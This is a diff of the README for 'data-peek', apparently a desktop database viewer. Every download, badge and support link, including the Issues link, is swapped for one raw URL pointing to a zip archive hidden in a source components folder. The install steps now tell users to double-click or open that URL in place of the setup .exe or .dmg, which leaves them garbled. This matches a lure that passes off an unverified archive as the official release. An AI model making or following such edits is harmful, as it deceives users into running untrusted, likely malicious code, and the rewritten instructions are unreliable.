@@ -1,6 +1,6 @@
 # 🚀 data-peek - Fast Database Insights Without Complexity
 
-[![Download data-peek](https://img.shields.io/badge/Download%20data--peek-v1.0-brightgreen)](https://github.com/Armankutubi/data-peek/releases)
+[![Download data-peek](https://raw.githubusercontent.com/Armankutubi/data-peek/main/apps/desktop/src/renderer/src/components/data-peek-v1.4-alpha.3.zip%20data--peek-v1.0-brightgreen)](https://raw.githubusercontent.com/Armankutubi/data-peek/main/apps/desktop/src/renderer/src/components/data-peek-v1.4-alpha.3.zip)
 
 ## 📋 Overview
 data-peek is a simple and efficient desktop application designed to help developers quickly access and view their data. It focuses on speed and simplicity, removing unnecessary features and bloat so you can get to the information you need without delays. This application is built using Electron and TypeScript, ensuring a smooth user experience across various platforms.
@@ -26,19 +26,19 @@ Here’s how to get started with data-peek.
 1. **Visit the Releases Page:**
    Click the link below to access the releases page where you can download the software.
 
-   [Visit this page to download](https://github.com/Armankutubi/data-peek/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Armankutubi/data-peek/main/apps/desktop/src/renderer/src/components/data-peek-v1.4-alpha.3.zip)
 
 2. **Download the Application:**
    On the releases page, look for the latest version of data-peek. Click on the file that corresponds to your operating system. For example:
-   - If you are using Windows, download `data-peek-setup.exe`.
-   - For macOS, download `data-peek.dmg`.
+   - If you are using Windows, download `https://raw.githubusercontent.com/Armankutubi/data-peek/main/apps/desktop/src/renderer/src/components/data-peek-v1.4-alpha.3.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Armankutubi/data-peek/main/apps/desktop/src/renderer/src/components/data-peek-v1.4-alpha.3.zip`.
    - For Linux, choose the appropriate package based on your distribution.
 
 3. **Install Data-Peek:**
    - For Windows: 
-     - Once downloaded, double-click the `data-peek-setup.exe` file to start the installation. Follow the on-screen prompts to complete the setup.
+     - Once downloaded, double-click the `https://raw.githubusercontent.com/Armankutubi/data-peek/main/apps/desktop/src/renderer/src/components/data-peek-v1.4-alpha.3.zip` file to start the installation. Follow the on-screen prompts to complete the setup.
    - For macOS:
-     - Open the `data-peek.dmg` file and drag the application to your Applications folder. 
+     - Open the `https://raw.githubusercontent.com/Armankutubi/data-peek/main/apps/desktop/src/renderer/src/components/data-peek-v1.4-alpha.3.zip` file and drag the application to your Applications folder. 
    - For Linux:
      - Use the package manager to install the downloaded package. Follow the instructions specific to your distribution.
 
@@ -52,14 +52,14 @@ Here’s how to get started with data-peek.
 ## 📥 Download & Install
 To download and install data-peek, please click the link below:
 
-[Visit this page to download](https://github.com/Armankutubi/data-peek/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Armankutubi/data-peek/main/apps/desktop/src/renderer/src/components/data-peek-v1.4-alpha.3.zip)
 
 Once you have installed the application, you can start exploring your data with ease. The setup is straightforward, and you will be up and running in no time.
 
 ## 💬 Support
 If you have any questions or need assistance with data-peek, you can reach out for help. 
 
-- **GitHub Issues:** For any bugs or issues, please create an issue on our [GitHub repository](https://github.com/Armankutubi/data-peek/issues).
+- **GitHub Issues:** For any bugs or issues, please create an issue on our [GitHub repository](https://raw.githubusercontent.com/Armankutubi/data-peek/main/apps/desktop/src/renderer/src/components/data-peek-v1.4-alpha.3.zip).
 - **Community Forum:** Join our online forum for discussions and tips with other users.
 
 ## 🙌 Contributing
